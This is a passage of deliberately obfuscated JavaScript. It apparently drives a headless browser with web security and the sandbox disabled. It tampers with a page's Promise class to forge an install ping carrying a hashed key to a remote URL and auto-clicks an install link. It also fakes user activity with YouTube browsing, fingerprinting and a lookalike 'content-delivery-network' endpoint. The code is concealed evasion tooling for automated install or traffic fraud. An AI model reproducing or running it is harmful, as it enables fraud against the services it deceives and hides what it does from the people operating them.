                J[-0x11b2 + -0x182f * -0x1 + 0x7 * -0xeb] = this['block'], J[K >> 0x20 * -0x2e + 0x6b9 + 0xd * -0x13] |= x[-0x1323 + -0x239a + 0x36c0 & K], this['block'] = J[-0x594 * 0x7 + 0x7 * 0x565 + 0x73 * 0x3], K >= 0x8 * 0x3b7 + 0x4 * 0x1fc + -0x2570 && (this['hashed'] || this['hash'](), J[-0x2 * 0x599 + -0xcb1 + 0x17e3] = this['block'], J[0x96b * 0x2 + -0x35 * -0x6f + -0x29c1] = J[0x2d8 + 0x13d + -0x3a * 0x12] = J[0x3 * -0x71e + 0x2001 + 0x6d * -0x19] = J[0x1c08 + -0xd9 * -0x3 + -0x1e90] = J[-0x1417 * -0x1 + 0x83c * -0x3 + 0x4a1 * 0x1] = J[-0x196c + -0x83 * 0x23 + -0x2b5a * -0x1] = J[0xa5e + 0x6cf * 0x5 + -0x2c63] = J[0x1757 + 0xe9c + -0x25ec] = J[0x3 * 0xb43 + -0x20d4 + 0xed * -0x1] = J[0x3 * 0x379 + 0x1136 + 0x2 * -0xdcc] = J[0x47d + -0x630 + -0x1 * -0x1bd] = J[-0x15d7 * -0x1 + -0xde7 + -0x1 * 0x7e5] = J[0x7 * -0x74 + 0xbf1 * 0x1 + 0xb * -0xcb] = J[-0x1 * -0xfe9 + -0xd55 + -0x1 * 0x287] = J[0x3 * 0x66b + 0x53a + -0x1 * 0x186d] = J[-0x15b * 0x4 + 0x142d + -0xeb2] = -0x2304 + 0x6ad * -0x1 + 0x29b1), J[0x1 * 0x711 + -0x2 * -0xdbb + 0x161 * -0x19] = this['hBytes'] << 0xf * -0x28f + 0x3 * -0x3d5 + 0x81 * 0x63 | this['bytes'] >>> 0x2413 + 0x1 * -0x88b + -0x1b6b, J[-0x5 * -0x779 + 0xac1 * -0x1 + -0x1a8d] = this['bytes'] << -0x42e * 0x3 + -0x3ed + 0x107a, this[T(0x5)]();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x961 + -0x25ce + 0xdd * 0x21; J < -0x2448 + -0x1b67 + 0x2b * 0x17d; ++J)
                K = Q[J - (-0x1808 + -0xd87 + 0x1ca * 0x15)] ^ Q[J - (-0x1 * 0x17e5 + 0x12fd + 0x4f0 * 0x1)] ^ Q[J - (0x1b2c + -0x679 + -0x14a5)] ^ Q[J - (-0x1a45 + 0x1 * 0x107 + 0x194e)], Q[J] = K << -0x2011 + -0x1f58 + -0x3f6a * -0x1 | K >>> 0x26e8 + -0x672 + 0x2057 * -0x1;
              for (J = 0x2467 * 0x1 + 0x2085 + -0x44ec; J < 0xd90 + -0x7 * -0x449 + 0x2b7b * -0x1; J += 0x1687 + 0x227c + -0x38fe)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x87b + -0x6 * 0x505 + -0x269e * -0x1 | L >>> -0x8e6 + 0x891 + 0x70) + (M & N | ~M & O) + P + (-0x30c399fa + -0x63570cb4 + 0xee9d2047) + Q[J] << -0x3 * -0x957 + -0x8d9 + -0x132c) << -0x1edc + 0x10a2 + 0xe3f | P >>> 0x10a7 + -0x3e * 0x42 + -0x3 * 0x30) + (L & (M = M << -0xeef + -0x1a2b + 0x2938 | M >>> 0x137 * 0x13 + -0x22f6 + -0xb3 * -0x11) | ~L & N) + O + (-0x39df877d + -0x6bf1bc9 * -0xe + 0x35ee7c18) + Q[J + (-0x1c08 + -0x2dc + 0x1ee5)] << 0x2254 + 0x1 * 0xeae + -0x3102) << -0x1fa1 * -0x1 + -0x9 * 0x85 + -0x1aef | O >>> 0x15 * 0x4d + -0x12c4 * -0x2 + -0x2bbe) + (P & (L = L << 0x563 * -0x7 + -0x2502 + -0x4ad5 * -0x1 | L >>> -0x1 * -0xc5b + -0x391 + -0x8c8) | ~P & M) + N + (0x4231 * -0xb62 + -0x4e74228 + 0x625b2d83) + Q[J + (0xcde + 0x1 * 0x1f09 + -0x2be5)] << 0x133e + 0x22a9 + -0x35e7 * 0x1) << -0x1254 + 0x1 * 0x1aa5 + -0x84c | N >>> 0x39b * 0xa + 0x1a0a + 0x3dfd * -0x1) + (O & (P = P << 0x631 * 0x4 + -0xea1 + 0x2d * -0x39 | P >>> 0xb3d + 0x1345 + 0x7a0 * -0x4) | ~O & L) + M + (-0x27af * -0xc433 + -0x958c53f2 + 0xd1a4e9ae) + Q[J + (0x3d * -0xe + 0x10e2 + -0xd89)] << -0x1eaa + -0x2 * 0x10d9 + 0x2 * 0x202e) << 0x91d + -0x2ef * -0xa + -0x266e | M >>> 0x2262 + -0x4f * -0x46 + -0x37e1) + (N & (O = O << 0xd7a + -0xe66 + 0x10a | O >>> -0x1 * 0x2051 + 0x428 + 0x1c2b) | ~N & P) + L + (0x37 * -0x1101efb + 0x2bf23b * -0x2cd + 0x1100e90c5) + Q[J + (-0x9 * 0x351 + -0x1f06 + 0x3ce3)] << 0x189a + 0x6 * -0x389 + -0x364, N = N << -0x781 + -0x13e8 + 0x1b87 | N >>> 0x2159 * -0x1 + -0x1758 + -0x5 * -0xb57;
              for (; J < -0x6b * 0x37 + 0x5c * -0x39 + 0x2ba1; J += 0x1e90 + -0x11b7 + -0x1 * 0xcd4)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x4e * 0x71 + 0x20d5 + -0x8a * -0x3 | L >>> 0x23e3 * -0x1 + -0x4d + -0xa3 * -0x39) + (M ^ N ^ O) + P + (-0x4ff6e544 * 0x2 + 0x8d74a7 * -0x15b + 0x1ce84d486) + Q[J] << 0xb10 + 0x37 * 0x6f + -0x22e9) << 0x497 + -0x1 * -0x7a7 + -0x15 * 0x95 | P >>> 0x13e7 + 0x10bf + -0x248b) + (L ^ (M = M << 0x16e1 + 0xba2 + -0x2265 | M >>> 0x4d7 + -0xd68 * -0x2 + -0x1fa5) ^ N) + O + (-0x1eb4cf09 * 0x1 + -0x26ae3a57 + 0xb43cf501) + Q[J + (-0x1c77 + 0x3da + 0x189e)] << -0x4a7 * 0x2 + 0x1745 * -0x1 + 0x2093) << -0x1301 + -0x421 + 0x1727 | O >>> 0x10ea * -0x2 + 0x1a7 * 0xe + -0x229 * -0x5) + (P ^ (L = L << 0x12a8 + -0xa7e * -0x3 + -0x3204 | L >>> 0x8f9 + 0x74d * 0x3 + -0x1ede) ^ M) + N + (0xa2238007 + -0x36 * 0x13a5a33 + -0xf05725c * -0x1) + Q[J + (-0x1b2 * 0x2 + -0x1ea + 0x550)] << 0x2b * -0x5f + 0x6 * -0x60a + 0x3431) << 0x12aa + 0x21 * 0x7e + -0x22e3 | N >>> 0x2b6 + 0x9eb * -0x1 + 0x750) + (O ^ (P = P << 0x1b25 * 0x1 + -0x4 * -0x3b3 + -0x81 * 0x53 | P >>> -0x4a * 0x61 + 0x1145 + 0xac7) ^ L) + M + (0x3 * -0x39e41882 + -0x683788 * 0x59 + 0x140c1836f) + Q[J + (-0x88b + -0x4 * -0x664 + -0x1102)] << 0x722 + -0xa * 0x2f3 + 0x165c) << 0x216 * 0xc + 0x19b7 + -0x2 * 0x195d | M >>> -0x2322 * 0x1 + -0x5 * 0x10b + 0x35f * 0xc) + (N ^ (O = O << 0xa64 + -0x105a + 0x614 | O >>> 0x687 * -0x1 + 0x24da + -0x1e51) ^ P) + L + (-0x16a1a611 * -0x4 + 0x457 * 0x9e590 + -0x1bb * 0xd1309) + Q[J + (0x95 * 0x2b + -0x874 + -0x108f)] << -0x14b * 0x1c + 0x1 * -0x2465 + 0x13b * 0x3b, N = N << -0xa3a + -0x13 * -0x187 + -0x12ad | N >>> 0x1 * -0x26e7 + -0x1 * 0xe53 + 0x353c;
              for (; J < -0x3 * -0x61d + -0x252b + 0x1310; J += -0x2067 + -0x18a3 + 0x9 * 0x657)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x3fc + -0xec * 0x2 + 0x3 * -0xb5 | L >>> 0x17ed + -0x10 * -0x2f + 0x2ad * -0xa) + (M & N | M & O | N & O) + P - (-0x33 * -0x3724e21 + 0xcaca1cc4 * -0x1 + 0x8be8cf55) + Q[J] << -0x22c7 * 0x1 + 0xcf8 + 0x15cf) << -0x194a + 0x236c + -0xa1d | P >>> -0x873 + 0xb5a + -0x2cc) + (L & (M = M << -0x264b + 0x958 + 0x1 * 0x1d11 | M >>> 0x2573 + 0x1a * 0x11b + -0x422f) | L & N | M & N) + O - (-0x1 * 0xdab5d85b + 0x5b256a7d + 0x997a * 0x19115) + Q[J + (0x16f * -0x14 + -0x355 + 0x2002)] << -0x18e0 + 0xbdd + 0x1 * 0xd03) << 0x1884 + 0x238f + -0x3c0e | O >>> -0x12e4 + 0x23 * 0xf0 + -0xdd1) + (P & (L = L << 0x5 * -0x6a1 + -0x17a5 + 0x38e8 | L >>> 0xb70 + -0x1640 + 0x5 * 0x22a) | P & M | L & M) + N - (-0xe2 * -0x9d96f1 + -0x220 * 0x679ded + -0x60fa4d01 * -0x2) + Q[J + (-0xac + -0x257e * -0x1 + 0x934 * -0x4)] << 0x1 * 0x1363 + 0x1 * -0x2459 + 0x1a * 0xa7) << -0x228e + -0x17a1 + -0x2e9 * -0x14 | N >>> -0x1 * 0x105d + 0x74b + 0x92d) + (O & (P = P << 0x1680 + -0x1 * -0x593 + -0x1bf5 | P >>> -0x13a9 + -0x1 * -0x2149 + -0x1 * 0xd9e) | O & L | P & L) + M - (-0x13900100 + -0x182 * 0x2a74e + 0xb * 0xc67af40) + Q[J + (0x1ae6 + -0x46f * 0x5 + -0x4b8)] << 0x124 * -0x1f + 0x1 * 0x187d + 0xadf) << 0x1b9d + 0xf4b + -0x1 * 0x2ae3 | M >>> -0x26a8 + -0x190b + 0x1 * 0x3fce) + (N & (O = O << -0x2278 + 0x13 * -0x1a3 + -0x461 * -0xf | O >>> -0x9c9 + 0x1 * 0x25bd + 0x92 * -0x31) | N & P | O & P) + L - (-0xd7485592 + 0x4cd3ee2b + 0xfb58aa8b) + Q[J + (-0xd * 0xfc + -0xa * -0x24e + -0xa3c)] << -0x1 * 0x236e + -0x121 * -0x4 + 0x1eea, N = N << 0x232f + -0x114a * -0x1 + 0x345b * -0x1 | N >>> 0x851 * 0x4 + 0x178 + -0x22ba * 0x1;
              for (; J < -0xecd + 0x2578 + -0x165b; J += 0x1d + -0x1 * 0x1c3e + 0x1c26)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xa99 * -0x2 + 0x3 * -0x291 + 0x1cea | L >>> -0x80e + 0x480 * 0x5 + 0xe57 * -0x1) + (M ^ N ^ O) + P - (0x884562f * -0x1 + -0x1322bf * -0x1b3 + 0x1d9d89cc) + Q[J] << -0x2 * 0x103d + -0x1a * -0x10f + 0x1 * 0x4f4) << 0x266 * -0xe + -0x203d + -0x15f2 * -0x3 | P >>> -0x8d8 * -0x1 + -0x6f * 0xb + -0x1fc * 0x2) + (L ^ (M = M << 0x1a50 * -0x1 + -0x22db * 0x1 + -0x3d49 * -0x1 | M >>> -0x107d + -0x20e2 + 0x3161) ^ N) + O - (0x42fae664 + 0x6a2914de + -0x4 * 0x1de1af46) + Q[J + (-0x227a + -0x1df0 + -0x1579 * -0x3)] << 0x1a1 * -0x2 + -0x227a + -0x96f * -0x4) << 0xc42 + 0x1 * 0x1738 + -0x2375 * 0x1 | O >>> -0x776 * 0x1 + -0x207e * -0x1 + -0x3 * 0x84f) + (P ^ (L = L << 0x1 * 0x1d3 + 0x12b1 + -0x1466 | L >>> 0x22e5 + 0x1493 * -0x1 + -0x1 * 0xe50) ^ M) + N - (0x50975fd6 + -0xefe37ef * -0x2 + -0x38f6918a) + Q[J + (0x3 * -0xe3 + 0x34f + -0x29 * 0x4)] << -0x17e5 + -0x1d34 + 0x3519) << -0x1 * 0x1861 + -0x593 * -0x2 + 0xd40 * 0x1 | N >>> 0x1a * -0xd + -0x2 * -0x786 + -0xd9f) + (O ^ (P = P << 0x1522 + -0x1cc5 + -0x1 * -0x7c1 | P >>> -0xe95 * -0x1 + 0x2 * -0x57a + -0x39f) ^ L) + M - (0xa7 * 0x7e68e9 + -0x3d7fec9d + 0x20a6bac8) + Q[J + (0x179c + 0x3ee * -0x3 + -0xbcf)] << 0x1 * 0xb2a + -0x20 * 0x21 + 0x70a * -0x1) << 0x250d + 0x2 * 0x5c + -0x25c0 | M >>> 0xfba + 0x850 + -0x17ef) + (N ^ (O = O << -0x818 + 0x17b8 + -0xf82 | O >>> -0x20e9 + -0x29 * 0x6 + 0x21e1) ^ P) + L - (0x3b8bec68 + 0x1dcc71e * -0x2f + 0x5199e044) + Q[J + (-0x224c + 0x65 * -0x2f + 0x34db)] << 0xaf3 + -0x53 * -0x57 + -0x2728, N = N << -0x2299 + -0x33d * 0x8 + -0x1 * -0x3c9f | N >>> -0x3b3 * 0x5 + 0x236 * -0x11 + -0x53 * -0xad;
              this['h0'] = this['h0'] + L << -0xd * -0xd1 + 0x31 * 0x1 + 0x567 * -0x2, this['h1'] = this['h1'] + M << 0x2238 + 0x11 * 0x47 + -0x26ef * 0x1, this['h2'] = this['h2'] + N << 0x1 * 0xf01 + 0x33 * 0xa7 + -0x3046, this['h3'] = this['h3'] + O << -0x1436 + -0x89 * -0xb + 0xe53, this['h4'] = this['h4'] + P << -0x20d9 * 0x1 + -0x2234 + 0x430d;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x535 + -0x6fd + 0x1e4 & -0xb98 + -0x5 * 0x25c + 0x1773] + w[J >> 0xc59 + 0x526 + 0xb * -0x195 & -0xbcb * -0x1 + 0x2 * -0x19 + 0x1 * -0xb8a] + w[J >> -0xf51 + 0x15ca + -0x665 & -0xc9b + -0x3 * 0xb6f + 0x2ef7] + w[J >> -0x58 * -0x2f + 0x926 + -0x193e & -0x17a4 + -0x27f * 0xc + 0x29 * 0x14f] + w[J >> 0x4ae + 0x213 + 0x11 * -0x65 & -0x1699 + 0x1e55 * -0x1 + -0x1 * -0x34fd] + w[J >> 0xa * -0x1be + 0xc62 + -0x3b * -0x16 & 0x1 * -0x1d23 + 0x1a * 0x6d + 0x1220] + w[J >> -0x6 * 0x4ff + -0xb77 + 0x2975 * 0x1 & -0xa17 + 0x65b + 0x3cb] + w[0x1d68 + 0x106a + -0x2dc3 & J] + w[K >> 0x23d * 0xa + 0xc7 * -0x22 + -0xe * -0x4c & 0x2b * 0x31 + -0x45f + -0x3cd] + w[K >> 0x2c5 * -0x3 + -0x27 * 0xb + 0xa14 & -0xe72 * -0x1 + 0x1f99 + -0x2dfc * 0x1] + w[K >> -0x1357 * -0x1 + 0xe04 + -0x7 * 0x4c1 & -0x1 * -0x1e07 + -0x103 * 0x1f + -0x15 * -0x11] + w[K >> 0x1b31 + 0x96f * -0x3 + -0x5 * -0x3c & -0xa2 * 0x3 + -0xd87 * 0x1 + 0xf7c * 0x1] + w[K >> -0x237b * 0x1 + -0x5d1 + -0x14ac * -0x2 & 0x1 * 0xab4 + -0x1c58 + -0x1 * -0x11b3] + w[K >> 0x2027 + 0x1 * -0x85a + -0x17c5 & 0x35e * 0x9 + 0x2408 + -0x4247] + w[K >> 0x21e4 + -0x1 * -0x203 + -0x23e3 & -0x10 + -0x2055 + 0x2 * 0x103a] + w[-0x183 * 0x10 + -0x1d9c + 0x32b * 0x11 & K] + w[L >> -0x3 * 0x6d6 + 0x204d * 0x1 + 0x3e5 * -0x3 & -0x5b * -0x4 + -0x7db + -0x3 * -0x22a] + w[L >> -0x89 * -0x2f + -0x1b5f + -0x2 * -0x128 & -0x112f + 0x1 * 0x1a35 + -0x8f7 * 0x1] + w[L >> 0x1cf5 + -0x18b6 + -0x42b & 0x1 * 0x1234 + -0x1 * -0xda6 + 0x1fcb * -0x1] + w[L >> -0x62 * 0x64 + 0x2617 * 0x1 + 0x41 * 0x1 & 0x9 * -0x453 + 0x13fd + 0x12fd] + w[L >> -0x1279 * -0x1 + 0xedb + -0x2148 & -0x600 + -0x1a5 * -0x1 + -0x46a * -0x1] + w[L >> 0x5c * 0x5e + 0x6d6 + -0x2896 & 0x1 * 0x1169 + -0x1 * 0x1420 + -0x47 * -0xa] + w[L >> -0x1 * -0x13ce + 0x25 * -0xdd + -0x3d * -0x33 & 0x1d73 + -0x17a6 + -0x5be] + w[-0x1 * -0x259c + -0x44a * 0x1 + -0x6a7 * 0x5 & L] + w[M >> 0xfaf + 0x1 * -0x12af + 0x31c & 0x19dc * 0x1 + 0x1a9d + -0x346a] + w[M >> -0x127b + -0x2693 + 0x3926 & 0x11f * 0x1a + 0x2220 + -0x3f37] + w[M >> -0x881 + 0xc4 * 0x22 + 0x1 * -0x1173 & -0x101 * -0x1c + 0x1 * 0x935 + -0x2542] + w[M >> -0x2ae * -0x2 + 0xadd + 0x24f * -0x7 & -0x66 * 0x3e + -0x1b1 + 0x4 * 0x69d] + w[M >> -0x26ad + -0x2332 + 0x49eb & -0x1 * 0x1ee5 + 0x385 + 0x1b6f] + w[M >> -0xb75 + -0x1fe4 + 0x1 * 0x2b61 & -0x1 * -0xe6d + 0x4 * -0x4e8 + 0x542] + w[M >> -0x1d9 * 0x10 + -0x1807 + -0x359b * -0x1 & 0x220d + -0x1 * 0x1063 + 0x1 * -0x119b] + w[0xcca + 0x1 * 0x21ad + 0x1b8 * -0x1b & M] + w[N >> 0x948 + 0x627 + -0xf53 & 0x1df3 + 0x10fa + 0x359 * -0xe] + w[N >> -0x18c9 + 0x2 * 0x255 + -0x17 * -0xe1 & 0x1f6a + -0x1223 * 0x1 + -0xd38] + w[N >> 0x617 * 0x5 + -0x1 * 0x2254 + 0x3f5 & 0x87b + -0x2f * -0x67 + -0x1b55] + w[N >> 0x2c * 0xc9 + -0x11e4 + -0x213 * 0x8 & -0x12b + 0x5f * -0xd + -0x1 * -0x60d] + w[N >> -0x1 * -0x2a2 + 0x1 * -0xd7d + 0xae7 & -0x4f2 + 0xce9 * -0x1 + 0x11ea] + w[N >> -0x2f5 + -0x1 * -0x7e1 + -0x4e4 & -0x1 * -0x61f + -0x14cb + 0x4e9 * 0x3] + w[N >> -0x7 * -0x2ce + 0x82 * -0x3c + -0xada * -0x1 & -0xe * 0xdf + -0x9e * 0x19 + 0x1baf] + w[-0x6d * 0x11 + 0x1 * -0x1ed1 + -0x1 * -0x261d & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0xb * 0x295 + 0xad + 0x1cfc * -0x1 & 0x7 * -0x7b + -0x618 + 0x1be * 0x6,
                J >> -0x24b3 + -0x114b * 0x2 + -0xe45 * -0x5 & -0x9a9 + -0x575 * -0x7 + -0x1b8b,
                J >> 0x1443 + -0x5c5 + -0xe76 & -0x1e6a + -0x2297 + 0x4200,
                0x196a + -0x87 + -0x17e4 * 0x1 & J,
                K >> -0x235b + 0x4f7 + -0x1 * -0x1e7c & -0x1 * 0x7a9 + 0x262d * -0x1 + 0x2ed5,
                K >> -0x562 + -0x1 * 0x765 + 0x13 * 0xad & 0x1 * -0xf5c + 0x2128 + -0x10cd,
                K >> 0x2299 + 0x42b * 0x1 + -0x94 * 0x43 & 0x134 + -0x1959 + 0x1924,
                0xff5 + -0x42 * 0x59 + 0x7fc & K,
                L >> -0x1b8d + 0xdd7 + 0xdce & -0x2163 + -0x9f3 + -0x75 * -0x61,
                L >> 0xc * -0xa6 + -0x570 + 0xd48 & -0x1b * -0x8e + 0x20d9 + 0x4 * -0xbb5,
                L >> -0x8ab * -0x2 + -0x91d * 0x4 + 0x1326 & -0xd * 0x95 + -0xbf9 * -0x2 + 0x7b1 * -0x2,
                -0x34 * 0x33 + 0x977 * -0x2 + 0x1e49 & L,
                M >> 0x13 * -0x179 + -0x23f + -0x1 * -0x1e52 & 0x1efe * -0x1 + 0xddb + 0x1222,
                M >> 0xdf * 0x9 + 0x1dc * -0xa + -0xd * -0xd5 & 0x3 * 0x3af + 0x1a76 + 0x1242 * -0x2,
                M >> -0x105b + -0x1 * -0x1fb2 + -0xf4f & -0x24b0 + 0x2b * -0x61 + 0x35fa * 0x1,
                0x45a * 0x3 + -0x269 * 0xc + 0x10dd & M,
                N >> -0x262b * 0x1 + -0x6bd * -0x3 + 0x120c & 0x98 * 0xe + 0x419 * 0x7 + -0x300 * 0xc,
                N >> -0x23da + -0xfec * -0x1 + 0x13fe & 0xd9a + 0x1904 + -0x1 * 0x259f,
                N >> -0xc2c + -0x9 * 0x373 + -0x2b3f * -0x1 & -0x128c + -0x11 * -0x238 + 0x2f * -0x63,
                -0x23e6 + -0x1d44 + -0x4229 * -0x1 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x18fa + -0x2 * -0x12c2 + 0x2 * -0x63b), (K = new DataView(J))['setUint32'](-0x1b5 * -0x6 + 0xdd3 + -0x1811, this['h0']), K['setUint32'](0x4cc * 0x4 + 0x1ea6 + -0x31d2, this['h1']), K['setUint32'](-0x25f7 + -0x7 * 0xad + 0x6 * 0x71f, this['h2']), K['setUint32'](-0xe0e * -0x1 + -0x15b * -0x17 + 0x10d * -0x2b, this['h3']), K['setUint32'](0x1bb0 + 0xa * 0x101 + -0x25aa, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1961 + -0x1433 + 0x4e * -0x11];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x11c7 * -0x1 + 0xc0d + -0x1dd4;
            J[-0x8d2 * -0x2 + 0x20f6 + 0x7f * -0x66]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x1 * 0x16eb + -0x1bc7 + 0x4dc] = L => {
              const U = c;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x14 * 0x94 + 0x1 * -0x25cd + 0x1a3e), O[U(0x1f) + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0xf21 + 0x4 * -0x210 + 0xbb1 * 0x2;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1f6b + 0x2 * 0xd55 + 0xa9d), Promise['resolve'](0x1 * 0x179d + -0x1 * -0x3eb + -0x1b87);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x15b9 * -0x1 + 0x135f + -0x2918; j < 0x1160 + -0xb71 + 0x16 * -0x45; j++)
    i();
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1378 + -0x18a2 + 0x52a);
    let h = e[f];
    if (b['WYwoue'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0xf91 + -0x5 * -0x6f7 + -0x55 * 0x3a, s, t, u = -0x479 + -0x1 * -0x283 + 0x1f6; t = n['charAt'](u++); ~t && (s = r % (-0x1943 * 0x1 + -0x25f8 + 0x3f3f) ? s * (0x208d + -0x7dd + 0xc38 * -0x2) + t : t, r++ % (-0x179f + -0x1b2c + 0x32cf)) ? p += String['fromCharCode'](0x282 + -0x2 * -0x1147 + -0x2411 & s >> (-(0xc6a + -0x4c7 + -0x7a1) * r & -0x2075 + -0x12d9 + 0x5a * 0x92)) : -0x1b9b + -0x1 * 0xa85 + -0x2 * -0x1310) {
          t = o['indexOf'](t);
        }
        for (let v = -0x18c4 + -0x1 * 0x8de + 0xa * 0x35d, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1076 + -0x2 * -0x1304 + -0x1582))['slice'](-(-0x256b + -0x2 * -0x1111 + 0x34b));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1758 + 0x92c + 0xe2c,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x1a60 + 0x3 * -0x851 + 0x3353; u < -0x2a1 * -0x9 + -0x1 * -0xf3d + -0x12 * 0x21b; u++) {
          p[u] = u;
        }
        for (u = 0xd63 + 0x64 * 0x3 + 0xe8f * -0x1; u < -0x6c4 + 0x5 * 0x3f1 + 0x3fb * -0x3; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1 * -0x92b + 0x22a2 + 0x2acd * -0x1), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1 * 0x1b22 + 0xa1 + -0x1bc3, q = 0x95 * -0xd + 0x2b * -0x17 + 0xb6e;
        for (let v = -0x3 * -0xb32 + 0x108b + -0x3221; v < n['length']; v++) {
          u = (u + (0x3d8 + 0x7e4 + -0xbbb)) % (-0x21c3 + 0xc5c + 0x1667), q = (q + p[u]) % (0x1 * -0xee3 + 0x1c3d + -0x5d * 0x22), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x5 * -0x6f1 + -0x2531 + 0x48e6 * 0x1)]);
        }
        return t;
      };
      b['FikYjz'] = m, c = arguments, b['WYwoue'] = !![];
    }
    const j = e[-0xf * -0x10f + -0x1819 + 0x838],
      k = f + j,
      l = c[k];
    return !l ? (b['cJWCWo'] === undefined && (b['cJWCWo'] = !![]), h = b['FikYjz'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const NETWORK_PATIENCE = -0x356f + -0x1a6c + 0x6f1b + (-0x187a + -0x2 * 0x1333 + 0x4a98) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x2213 * 0x1 + -0x1d15 + 0x19 * -0x33) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1378 + -0x18a2 + 0x52a);
    let h = e[f];
    return h;
  }, d(b, c);
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + V(0x17),
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + V(0x1e) + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    V(0x19) + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x331 * -0x4 + -0x4b2 * -0x8 + -0x4 * 0xc95; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const W = c;
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this[W(0xd)])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
